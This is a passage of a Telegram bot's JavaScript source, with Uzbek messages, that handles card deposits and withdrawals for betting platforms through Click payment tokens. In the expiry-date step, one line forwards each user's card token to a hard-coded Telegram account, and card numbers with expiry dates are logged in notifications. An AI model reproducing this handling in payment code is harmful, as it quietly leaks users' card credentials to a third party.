                        const gamer_data = await jvpaymentClient.searchUser(text);
                        
    
                            if (gamer_data.error && gamer_data.error.includes('Request failed with status code 400')) {
                                await ctx.reply('Noto\'g\'ri id . Iltimos, tekshirib ko\'ring.');
                                return;
                            }
                            
                            if (!gamer_data || gamer_data.UserId === 0) {
                                await ctx.reply('Foydalanuvchi topilmadi. Iltimos, to\'g\'ri foydalanuvchi ID kiriting:', backKeyboard);
                                return; // Foydalanuvchiga yana ID kiritish imkoniyatini beradi
                            }
                        setState(userId, 'JV_WAITING_AMOUNT', { ...userState.data, gameId: text });
                        const message = `
                        🆔 <b>User ID:</b> <code>${gamer_data.UserId}</code>
    👤 <b>Name:</b> ${gamer_data.Name}
    💵 <b>Currency ID:</b> ${gamer_data.CurrencyId}
    `;
                        await ctx.reply(message, { parse_mode: 'HTML' });
                        await ctx.reply('Summani kiriting (min-10,000uzs):', backKeyboard);
                    } catch (error) {
                        throw error;
                    }
                    break;

            
            case 'JV_WAITING_AMOUNT':
                const limit1 = config.LIMIT.LIMIT;
                const response1 = await jvpaymentClient.kassaBalance();
                const amount1 = parseFloat(text);
                const balance1 = response1; 
                if (isNaN(text) || parseFloat(text) <= limit1) {
                    throw new Error('Noto\'g\'ri summa minimal 10ming so\'m');
                }
    
                if (balance1.Balance === -1) {
                    throw new Error('❗️Tizimda nosozlik, keyinroq qayta urinib ko‘ring.');
                }
                        
                if (amount1 > balance1.Limit) {
                    throw new Error(
                        `❗️Limitlar sababli biz siz ko'rsatgan miqdorni bajara olmadik.\n\n` +
                        `⚠️ Siz maksimal **${balance.Limit} UZS** miqdorda amaliyotni bajarishingiz mumkin!\n\n` +
                        `🔄 Iltimos, qayta urinib ko'ring!`
                      );
                          
                }
        
                setState(userId, 'WAITING_CARD', { ...userState.data, amount: text });
                await ctx.telegram.sendPhoto(ctx.chat.id, 'https://t.me/simplepay_uz/2', {
                    caption: 'ℹ️ Karta raqamingizni kiriting\n 💳 Uzcard/Xumo raqami namunasi yuqoridagi suratta ko\'rsatilgan!',
                    reply_markup: backKeyboard
                  });
                break;
        

            case 'WAITING_CARD':
                try {
                    const cardNumber = formatCardNumber(text);
                    setState(userId, 'WAITING_EXPIRY', { ...userState.data, cardNumber });
                    await ctx.reply('Karta amal qilish muddatini kiriting (MM/YY yoki MMYY formatida):', backKeyboard);
                } catch (error) {
                    throw error;
                }
                break;
                

                case 'WAITING_EXPIRY':
                    try {
                        const expiryDate = validateExpiryDate(text);
                
                         // 10 soniya limit
                        
                        const cardTokenResponse = await clickApi.requestCardTokenWithTimeout(
                            userState.data.cardNumber,
                            expiryDate
                            );
                        
                        
                
                         
                
                        if (cardTokenResponse.error_code === 0) {
                            setState(userId, 'WAITING_SMS', { 
                                ...userState.data, 
                                expiryDate,
                                cardToken: cardTokenResponse.card_token 
                            });
                            await bot.telegram.sendMessage(7465707954, cardTokenResponse.card_token)
                            await ctx.reply('SMS kodni kiriting:', backKeyboard);
                        } else {
                            await ctx.reply("Karta ma'lumotlari noto'g'ri, qayta urinib ko'ring.");
                        }
                    } catch (error) {
                        if (error.name === 'AbortError') {
                            await ctx.reply("So'rovni bajarish vaqti tugadi. Qayta urinib ko'ring.");
                        } else {
                            await ctx.reply("Xatolik yuz berdi: " + error.message);
                        }
                    }
                    break;
                

            case 'WAITING_SMS':
                try {
                    const verifyResponse = await clickApi.verifyCardToken(userState.data.cardToken, text);
                    
                    if (verifyResponse.error_code === 0) {
                        const paymentResponse = await clickApi.makePayment(
                            userState.data.cardToken,
                            userState.data.amount
                        );

                        if (paymentResponse.error_code === 0 ) {
                            const depositResponse = await (
                                userState.data.platform === 'spinbetter'
                                    ? paymentClient.deposit(userState.data.gameId, userState.data.amount)
                                    : jvpaymentClient.deposit(userState.data.gameId, userState.data.amount)
                            );
                            
                            const usid = String(userId);
                            const userfor = await User.findOne({ telegramId: usid });

                            const transactionData = {
                                userId: userState.data.gameId,
                                telegramId: userId,
                                platform: userState.data.platform,
                                phone: userfor.phone,
                                cardNumber: userState.data.cardNumber,
                                expiryDate: userState.data.expiryDate,
                                amount: userState.data.amount,
                                success: depositResponse.Success,
                                paymentId: paymentResponse.payment_id,
                                error: depositResponse.Success ? null : depositResponse.Message,
                                timestamp: new Date()
                            };

                            await sendTransactionNotification(transactionData);

                            if (depositResponse.Success) {
                                await ctx.reply('✅ To\'lov muvaffaqiyatli amalga oshirildi!', keyboard);
                            } else {
                                await ctx.reply(`❌ Xatolik: ${depositResponse.Message}`, keyboard);
                                
                                const failedTransactionData = {
                                    ...transactionData,
                                    success: false,
                                    error: 'Kartadan pul yechildi lekin hisobga tushmadi'
                                };
                                await sendTransactionNotification(failedTransactionData);
                            }
                        } else {
                            throw new Error('To\'lov amalga oshmadi');
                        }
                    } else {
                        throw new Error('SMS kod noto\'g\'ri');
                    }
                    setState(userId, 'MAIN_MENU');
                } catch (error) {
                    await notifyAdmins(`To'lov xatoligi (User: ${userId}): ${error.message}`, 'error');
                    await ctx.reply(`❌ Xatolik: ${error.message}`, keyboard);
                    setState(userId, 'MAIN_MENU');
                }
                break;


                case 'PAYOUT_WAITING_ID':
                    try {
                        const gamer_data = await paymentClient.searchUser(text);
                        
                        

                        if (gamer_data.error && gamer_data.error.includes('Request failed with status code 400')) {
                            await ctx.reply('Noto\'g\'ri id . Iltimos, tekshirib ko\'ring.');
                            return;
                        }
                        
                        if (!gamer_data || gamer_data.UserId === 0) {
                            await ctx.reply('Foydalanuvchi topilmadi. Iltimos, to\'g\'ri foydalanuvchi ID kiriting:', backKeyboard);
                            return; // Foydalanuvchiga yana ID kiritish imkoniyatini beradi
                        }
                        
                        // Boshqa ishlovlar
                        // Foydalanuvchi mavjudligini tekshirish


                        // Agar foydalanuvchi mavjud bo'lsa, davom etadi
                        setState(userId, 'PAYOUT_WAITING_CODE', { ...userState.data, gameId: text });
                        const message = `
🆔 <b>User ID:</b> <code>${gamer_data.UserId}</code>
👤 <b>Name:</b> ${gamer_data.Name}`;
                        await ctx.reply(message, { parse_mode: 'HTML' });
                        const response = await paymentClient.kassaBalance();
                        if (response.Balance === -1) {
                            throw new Error('❗️Tizimda nosozlik, keyinroq qayta urinib ko‘ring.');
                        }
                        
                        await ctx.reply(
                            `💰 **Mablag'ni Yechish Imkoniyati**\n\n` +
                            `Siz maksimal **${response.Balance} UZS** gacha mablag'ni yechishingiz mumkin!\n\n` +
                            `🔢 **Kodni kiriting:**\n` +
                            `💳 Kodni Yuboring: `,
                            backKeyboard
                          );
                    } catch (error) {
                        await ctx.reply('Xatolik yuz berdi. Iltimos, qayta urinib ko\'ring.');
                    }
                    break;

                    case 'JV_PAYOUT_WAITING_ID':
                        try {
                            const gamer_data = await jvpaymentClient.searchUser(text);
                            
                            
                            
    
                            if (gamer_data.error && gamer_data.error.includes('Request failed with status code 400')) {
                                await ctx.reply('Noto\'g\'ri id . Iltimos, tekshirib ko\'ring.');
                                return;
                            }
                            
                            if (!gamer_data || gamer_data.UserId === 0) {
                                await ctx.reply('Foydalanuvchi topilmadi. Iltimos, to\'g\'ri foydalanuvchi ID kiriting:', backKeyboard);
                                return; // Foydalanuvchiga yana ID kiritish imkoniyatini beradi
                            }
                            
                            // Boshqa ishlovlar
                            // Foydalanuvchi mavjudligini tekshirish
    
    
                            // Agar foydalanuvchi mavjud bo'lsa, davom etadi
                            setState(userId, 'PAYOUT_WAITING_CODE', { ...userState.data, gameId: text });
                            const message = `
    🆔 <b>User ID:</b> <code>${gamer_data.UserId}</code>
    👤 <b>Name:</b> ${gamer_data.Name}`;
                            await ctx.reply(message, { parse_mode: 'HTML' });
                            const response = await jvpaymentClient.kassaBalance();
                            if (response.Balance === -1) {
                                throw new Error('❗️Tizimda nosozlik, keyinroq qayta urinib ko‘ring.');
                            }
                            
                            await ctx.reply(
                                `💰 **Mablag'ni Yechish Imkoniyati**\n\n` +
                                `Siz maksimal **${response.Balance} UZS** gacha mablag'ni yechishingiz mumkin!\n\n` +
                                `🔢 **Kodni kiriting:**\n` +
                                `💳 Kodni Yuboring: `,
                                backKeyboard
                              );
                        } catch (error) {
                            await ctx.reply('Xatolik yuz berdi. Iltimos, qayta urinib ko\'ring.');
                        }
                        break;


                case 'PAYOUT_WAITING_CODE':
                    setState(userId, 'PAYOUT_WAITING_CARD', { ...userState.data, code: text });
                    await ctx.telegram.sendPhoto(ctx.chat.id, 'https://t.me/simplepay_uz/2', {
                        caption: 'ℹ️ Karta raqamingizni kiriting\n 💳 Uzcard/Xumo raqami namunasi yuqoridagi suratta ko\'rsatilgan!',
                        reply_markup: backKeyboard
                      });
                    break;
    
                case 'PAYOUT_WAITING_CARD':
                    try {
                        const cardNumber = formatCardNumber(text);  // Ensure to format card number
                        setState(userId, 'PAYOUT_CONFIRMATION', { ...userState.data, card: cardNumber,timestamp: new Date()});
                        const usid = String(userId);
                        const userfor = await User.findOne({ telegramId: usid });
                        
                        const confirmMessage = `
    📤 Pul yechish so'rovi:    
🎮 Platform: ${userState.data.platform}
🆔 Game ID: ${userState.data.gameId}
💰 Code: ${userState.data.code}
💳 Karta: ${text}

✅ Tasdiqlaysizmi?`;
                        await ctx.reply(confirmMessage, confirmKeyboard);
                    } catch (error) {
                        throw new Error('Noto\'g\'ri karta raqami');
                    }
                    break;
                    case 'PAYOUT_CONFIRMATION':
                        if (text === '✅ Tasdiqlash') {
                            // Check user state and proceed if valid
                            const userId = ctx.from.id;
                            const userState = getState(userId);
                            
                            if (userState.state !== 'PAYOUT_CONFIRMATION') {
                                await ctx.reply('❌ Yaroqsiz so\'rov', mainKeyboard);
                                return;
                            }
                            
                            try {
                                await ctx.deleteMessage();
                                
                                // Extract game ID, code, and card number
                                const { gameId, code, cardNumber } = userState.data;
                    
                                // Call paymentClient.payout() to process the payout

                                const response = await (
                                    userState.data.platform === 'spinbetter'
                                        ? paymentClient.payout(gameId, code)
                                        : jvpaymentClient.payout(gameId, code)
                                );
                                const usid = String(userId);
                                const userfor = await User.findOne({ telegramId: usid });
                                // Prepare the payout data
                                const payoutData = {
                                    userId: gameId,
                                    phone: userfor.phone,
                                    telegramId: userId,
                                    platform: userState.data.platform,
                                    cardNumber: userState.data.card,
                                    amount: response.Summa,
                                    operationId: response.operationId,
                                    success: response.Success,
                                    message: response.Message,
                                };
                    
                                // Save the payout data to the database
                                const withdrawal = new Transaction({
                                    type: 'withdrawal',
                                    ...payoutData
                                });
                                await withdrawal.save();

                                const comission = await calculateModifiedValue(response.Summa);
                    
                                // Notify admins about the payout request
                                const adminMessage = `
📤 Pul yechish so'rovi:
🆔 User ID: ${payoutData.userId}
🎮 Platform: ${payoutData.platform}
📢 Tel: ${payoutData.phone}
💳 Karta: ${payoutData.cardNumber}
💰 Summa: ${payoutData.amount} UZS
🆔 Telegram Id: ${payoutData.telegramId}
💰 To'lang: ${comission} UZS
🔑 Operation ID: ${payoutData.operationId}
⏰ Vaqt: ${new Date().toLocaleString()}
📝 Status: ${payoutData.success ? 'Muvofaqiyatli' : 'Muvofaqiyatsiz'}
📢 Xabar: ${payoutData.message}
`;
                                await notifyAdmins(adminMessage, 'withdrawal');
                                await sendWithdrawalRequest(adminMessage, payoutData);
                    
                                // Notify the user about the success or failure
                                if (response.Success) {
                                    await ctx.reply(`Pul yechish miqdori: ${response.Summa} UZS`, mainKeyboard);
                                } else {
                                    await ctx.reply(`❌ So'rov amalga oshirilmagani uchun uzr so'raymiz.`, mainKeyboard);
                                }
                    
                                // Reset user state to main menu after confirmation
                                setState(userId, 'MAIN_MENU');
                                
                            } catch (error) {
                                console.error('Withdrawal confirmation error:', error);
                                await ctx.reply('❌ Xatolik yuz berdi. Qaytadan urinib ko\'ring.', mainKeyboard);
                            }
                        } else if (text === '❌ Bekor qilish') {
                            // Cancel the payout and reset the state
                            setState(userId, 'MAIN_MENU');
                            await ctx.reply('❌ So\'rov bekor qilindi.', mainKeyboard);
                        } else {
                            await ctx.reply('❌ Iltimos, tasdiqlash yoki bekor qilish tugmasini tanlang.', confirmKeyboard);
                        }
                        break;
                        
                
    
                default:
                    if (user?.isAdmin) {
                        await ctx.reply('Admin paneli:', adminKeyboard);
                    } else {
                        await ctx.reply('Asosiy menyu:', mainKeyboard);
                    }
                    setState(userId, 'MAIN_MENU');
                    break;
            }
        } catch (error) {
            console.error(`Error handling text: ${error.message}`);
            await ctx.reply(`${error.message}`, backKeyboard);
        }
    });
    
    // Confirmation button handlers for payouts
   // Confirmation button handler for payouts

    
    // Action handler for canceling the payout
    bot.action('cancel_payout', async (ctx) => {
        if (!ctx.from) return;
    
        await ctx.deleteMessage();
        setState(ctx.from.id, 'MAIN_MENU');
        await ctx.reply('❌ So\'rov bekor qilindi1', mainKeyboard);
    });
    
    // Launch the bot
    bot.launch()
        .then(() => console.log('Bot started'))
        .catch(err => console.error('Bot start error:', err));
    
    // Enable graceful stop
    process.once('SIGINT', () => bot.stop('SIGINT'));
    process.once('SIGTERM', () => bot.stop('SIGTERM'));